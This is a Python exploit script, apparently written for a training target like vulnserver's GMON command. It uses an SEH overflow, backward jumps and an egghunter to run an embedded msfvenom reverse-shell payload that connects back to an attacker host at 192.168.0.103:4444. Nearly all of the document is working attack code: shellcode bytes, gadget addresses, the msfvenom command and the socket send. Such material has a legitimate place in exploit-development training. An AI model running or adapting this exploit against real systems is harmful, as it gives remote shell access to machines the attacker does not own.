
# concept
#	send shellcode a anywhere in junk A's
#	SEH Overflow > jump backwards > u face some random bytes >
#	so jump again backwards 100 bytes > now execute egghunter >
#	egghunter finds shellcode and executes it               

# it took me few hrs for this thats y i am just running the exploit

import socket 

#eip 497 so eip 499
#esp 501

#   00B6FFDC   32317630  0v12  Pointer to next SEH record   3371
#   00B6FFE0   4870524B  KRpH  SE handler                   3375


#62501301   5B               POP EBX
#62501302   5B               POP EBX
#62501303   C3               RETN



#6250127A   5E               POP ESI
#6250127B   5D               POP EBP
#6250127C   C3               RETN




s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('192.168.0.105',9999))
#s.connect(('127.0.0.1',9999))

pattern = 'unique_pattern'


junk = 'GMON '
junk += 'FLAGFLAG'
#calc_shellcode 
calc_shellcode = ("\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49"+\
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"+\
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"+\
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"+\
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"+\
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47"+\
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c"+\
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a"+\
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50"+\
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43"+\
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a"+\
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c"+\
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44"+\
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c"+\
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47"+\
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50"+\
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44"+\
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43"+\
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42"+\
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b"+\
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45"+\
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41")

# create reverse shell shellcode according to ur kali ip and put it here 
#   service is running so we have to run exploit to get shell
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.103 LPORT=4444 -b '\x00\x0a\0d' -f c
junk += ("\xda\xc7\xbb\x0f\xa2\xee\x62\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x58\x17\x83\xc0\x04\x03\x57\xb1\x0c\x97\x9b\x5d\x52"
"\x58\x63\x9e\x33\xd0\x86\xaf\x73\x86\xc3\x80\x43\xcc\x81\x2c"
"\x2f\x80\x31\xa6\x5d\x0d\x36\x0f\xeb\x6b\x79\x90\x40\x4f\x18"
"\x12\x9b\x9c\xfa\x2b\x54\xd1\xfb\x6c\x89\x18\xa9\x25\xc5\x8f"
"\x5d\x41\x93\x13\xd6\x19\x35\x14\x0b\xe9\x34\x35\x9a\x61\x6f"
"\x95\x1d\xa5\x1b\x9c\x05\xaa\x26\x56\xbe\x18\xdc\x69\x16\x51"
"\x1d\xc5\x57\x5d\xec\x17\x90\x5a\x0f\x62\xe8\x98\xb2\x75\x2f"
"\xe2\x68\xf3\xab\x44\xfa\xa3\x17\x74\x2f\x35\xdc\x7a\x84\x31"
"\xba\x9e\x1b\x95\xb1\x9b\x90\x18\x15\x2a\xe2\x3e\xb1\x76\xb0"
"\x5f\xe0\xd2\x17\x5f\xf2\xbc\xc8\xc5\x79\x50\x1c\x74\x20\x3d"
"\xd1\xb5\xda\xbd\x7d\xcd\xa9\x8f\x22\x65\x25\xbc\xab\xa3\xb2"
"\xc3\x81\x14\x2c\x3a\x2a\x65\x65\xf9\x7e\x35\x1d\x28\xff\xde"
"\xdd\xd5\x2a\x70\x8d\x79\x85\x31\x7d\x3a\x75\xda\x97\xb5\xaa"
"\xfa\x98\x1f\xc3\x91\x63\xc8\x2c\xcd\x6b\x6f\xc5\x0c\x6b\x7e"
"\x49\x98\x8d\xea\x61\xcc\x06\x83\x18\x55\xdc\x32\xe4\x43\x99"
"\x75\x6e\x60\x5e\x3b\x87\x0d\x4c\xac\x67\x58\x2e\x7b\x77\x76"
"\x46\xe7\xea\x1d\x96\x6e\x17\x8a\xc1\x27\xe9\xc3\x87\xd5\x50"
"\x7a\xb5\x27\x04\x45\x7d\xfc\xf5\x48\x7c\x71\x41\x6f\x6e\x4f"
"\x4a\x2b\xda\x1f\x1d\xe5\xb4\xd9\xf7\x47\x6e\xb0\xa4\x01\xe6"
"\x45\x87\x91\x70\x4a\xc2\x67\x9c\xfb\xbb\x31\xa3\x34\x2c\xb6"
"\xdc\x28\xcc\x39\x37\xe9\xfc\x73\x15\x58\x95\xdd\xcc\xd8\xf8"
"\xdd\x3b\x1e\x05\x5e\xc9\xdf\xf2\x7e\xb8\xda\xbf\x38\x51\x97"
"\xd0\xac\x55\x04\xd0\xe4")

len1 = len(junk)
junk += 'A'*(3376-100-100-len1+20)

junk2 = ''
junk2 += '\x90'*20
junk2 += '\x90'*4   
 # egghunter
#   egghunter  = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"+ "\xef\xb8" + "\x90\x50\x90\x50" +"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x46\x4c\x41\x47\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
junk2 += egghunter
junk2 += '\x90'*(100-24-len(egghunter))

junk2 += '\x90'*1   #10
junk2 += '\xeb\x9c'
junk2 += '\x90'*7
junk2 += '\xeb\x9c\x90\x90'

junk2 += 'B'*(100-14) # put random bytes here 3376-76

#   62501301
nseh = '\xeb\x88\x90\x90'

#   6250127A 
seh = '\x7A\x12\x50\x62'


junk3 = '\xcc'*20
junk3 += 'D'*(3995-(len(junk+junk2+nseh+seh+junk3)))

msg = s.recv(4096).decode()
print(msg)

payload = junk +  junk2 +  nseh + seh + junk3
#payload = 'GMON ' + 'A'*3990
payload = payload.encode('raw_unicode_escape')
print(len(payload))
s.send(payload)


s.close()


